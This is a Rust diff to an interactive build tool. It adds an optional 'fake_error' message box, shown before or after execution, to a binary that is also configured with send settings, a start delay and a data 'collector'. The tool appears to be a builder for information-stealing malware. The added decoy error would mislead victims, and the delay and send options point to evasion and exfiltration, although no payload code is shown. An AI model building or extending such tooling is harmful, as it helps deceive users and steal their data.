@@ -33,20 +33,19 @@ use inquire::InquireError;
 use inquire::ui::{Color, RenderConfig, StyleSheet, Styled};
 use quote::quote;
 use std::process::{Command, Stdio};
+use builder::message_box::{Show, MessageBox};
 
-fn build(send_settings: SendSettings, consider_empty: Vec<ConsiderEmpty>, start_delay: StartDelay) {
+fn build(
+    send_settings: SendSettings,
+    consider_empty: Vec<ConsiderEmpty>,
+    start_delay: StartDelay,
+    message_box: Option<MessageBox>,
+) {
     println!("\nStarting build...");
 
-    let collector = quote! {
-        collector
-    };
+    let mut builder = &mut Command::new("cargo");
 
-    let return_stmt = quote! {
-        return;
-    };
-
-    let _ = Command::new("cargo")
-        .arg("build")
+    builder = builder.arg("build")
         .env("RUSTFLAGS", "-Awarnings")
         .arg("--release")
         .arg("--features")
@@ -58,7 +57,7 @@ fn build(send_settings: SendSettings, consider_empty: Vec<ConsiderEmpty>, start_
         .env(
             "BUILDER_CONSIDER_EMPTY_EXPR",
             consider_empty
-                .to_expr_temp_file((collector, return_stmt))
+                .to_expr_temp_file((quote! {collector}, quote! {return;}))
                 .display()
                 .to_string(),
         )
@@ -67,8 +66,25 @@ fn build(send_settings: SendSettings, consider_empty: Vec<ConsiderEmpty>, start_
             start_delay.to_expr_temp_file(()).display().to_string(),
         )
         .stdout(Stdio::inherit())
-        .stderr(Stdio::inherit())
-        .status()
+        .stderr(Stdio::inherit());
+
+    if let Some(message_box) = message_box {
+        builder = builder
+            .arg("--features");
+        
+        builder = match message_box.show {
+            Show::Before => builder.arg("message_box_before_execution"),
+            Show::After => builder.arg("message_box_after_execution"),
+        };
+
+        builder = builder
+            .env(
+                "BUILDER_MESSAGE_BOX",
+                message_box.message.to_expr_temp_file(()).display().to_string(),
+            )
+    }
+
+    let _ = builder.status()
         .expect("Failed to start cargo build");
 }
 
@@ -99,7 +115,10 @@ fn main() {
     let send = ask!(SendSettings::ask());
     println!();
     let start_delay = ask!(StartDelay::ask());
+    println!();
+    let fake_error = ask!(Option::<MessageBox>::ask());
+    println!();
     let consider_empty = ask!(Vec::<ConsiderEmpty>::ask());
 
-    build(send, consider_empty, start_delay);
+    build(send, consider_empty, start_delay, fake_error);
 }
